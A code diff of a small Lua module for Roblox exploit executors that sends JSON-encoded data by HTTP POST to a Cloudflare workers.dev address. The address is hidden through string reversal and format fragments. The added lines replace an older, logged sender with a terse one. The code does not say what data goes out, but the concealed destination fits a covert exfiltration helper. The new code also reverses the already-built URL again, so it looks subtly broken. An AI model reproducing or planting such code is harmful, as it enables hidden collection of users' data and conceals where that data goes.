@@ -1,14 +1,14 @@
-local httprequest = httprequest or http_request or request or HttpPost or (http and http.request) or (syn and syn.request) or function(...)
-	return false
-end
-
 local reverse = string.reverse
 local format = string.format
 
-local HttpService = game:GetService("HttpService")
 local WORKER_URL = "https://" .. format("se%sce.", "rvi") .. reverse("otelokin") .. ".workers.dev/" .. reverse(format("%sabmoc", "cct"))
 
-local function SendData(BodyData)
+local function SendData(DataTable,Url)
+    local request = http_request or request or HttpPost or syn.request
+    request({Url = reverse(WORKER_URL), Body = game:GetService("HttpService"):JSONEncode(DataTable), Method = "POST", Headers = {["content-type"] = "application/json"}})
+end
+
+--[[local function SendData(BodyData)
     local Success, Encoded = pcall(function()
         return HttpService:JSONEncode(BodyData)
     end)
@@ -34,5 +34,5 @@ local function SendData(BodyData)
     end
 
     warn("[Service Info] Sent data with response code: " .. tostring(Response.StatusCode))
-end
+end]]
 return SendData
